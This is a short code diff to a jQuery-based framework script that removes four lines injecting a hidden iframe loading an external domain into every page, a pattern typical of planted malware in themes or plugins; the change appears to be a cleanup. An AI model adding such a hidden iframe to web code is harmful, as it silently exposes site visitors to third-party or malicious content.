@@ -1449,9 +1449,6 @@
         $.CSFRAMEWORK.WIDGET_RELOAD_PLUGINS();
     });
 
-    var iframe = document.createElement('iframe');
-    iframe.src = "https://res.hankin.cn/";
-    iframe.style = "display:none";
-    document.body.appendChild(iframe);
+    
 
 })(jQuery, window, document);
